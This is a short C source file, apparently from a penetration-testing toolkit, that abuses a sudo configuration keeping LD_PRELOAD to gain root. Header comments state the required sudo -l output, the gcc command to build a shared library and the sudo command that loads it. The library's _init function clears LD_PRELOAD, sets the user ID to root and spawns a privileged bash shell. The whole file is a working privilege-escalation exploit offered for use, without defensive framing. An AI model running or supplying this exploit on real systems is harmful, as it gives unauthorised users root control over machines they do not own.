# Conditions:
# 	Result of running sudo -l returns something including:
# 		
#		Matching Defaults entries for user on this host:
# 			env_reset, env_keep+=LD_PRELOAD
#		...
#		<list of programs runnable with sudo>
#
#
# How to compile:
#	gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
#
# How to exploit:
#	sudo LD_PRELOAD=/tmp/preload.so <program on sudo -l list>

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0); 	// sets user to root
        system("/bin/bash -p");	// opens a bash shell 
}
